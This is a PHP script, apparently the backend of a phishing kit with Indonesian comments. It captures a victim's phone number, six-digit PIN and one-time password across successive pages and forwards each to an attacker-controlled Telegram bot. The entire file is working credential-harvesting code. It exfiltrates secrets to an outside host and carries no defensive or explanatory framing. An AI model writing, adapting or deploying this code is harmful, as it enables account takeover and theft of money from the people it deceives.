<?php
session_start();

function handle_no_hp($no_hp)
{
    $_SESSION['nomor'] = $no_hp;
    send_to_telegram("Nomor HP: $no_hp");
    header("Location: pin.php");
    exit; // Menambahkan exit untuk menghentikan eksekusi skrip setelah pengalihan
}

function handle_pin($data)
{
    $pin = $data['pin1'] . $data['pin2'] . $data['pin3'] . $data['pin4'] . $data['pin5'] . $data['pin6'];

    if (!is_numeric($pin)) {
        header("Location: pin.php");
        exit; // Menambahkan exit untuk menghentikan eksekusi skrip setelah pengalihan
    }

    $_SESSION['pin'] = $pin;
    $_SESSION['nomor'] = $data['nomor'];

    send_to_telegram("Nomor: " . $_SESSION['nomor'] . "\nPin: $pin");
    header("Location: otp.php");
    exit; // Menambahkan exit untuk menghentikan eksekusi skrip setelah pengalihan
}

function handle_otp($data)
{
    $otp = $data['otp'];

    $_SESSION['otp'] = $otp;
    $_SESSION['pin'] = $data['pin'];
    $_SESSION['nomor'] = $data['nomor'];

    if (!is_numeric($otp)) {
        header("Location: otp.php");
        exit; // Menambahkan exit untuk menghentikan eksekusi skrip setelah pengalihan
    }

    send_to_telegram("Nomor: " . $_SESSION['nomor'] . "\nPin: " . $_SESSION['pin'] . "\nOtp: $otp");
    header("Location: otp.php");
    exit; // Menambahkan exit untuk menghentikan eksekusi skrip setelah pengalihan
}

function send_to_telegram($message)
{
    $config = include __DIR__ . '/config.php';
    $token = $config['telegram_bot_token'];
    $chat_id = $config['chat_id'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $chat_id,
        'text' => $message
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $server_output = curl_exec($ch);
    if ($server_output === false) {
        // Menangani kesalahan cURL dan mencatat kesalahan
        error_log('Curl error: ' . curl_error($ch));
    }
    curl_close($ch);
}
?>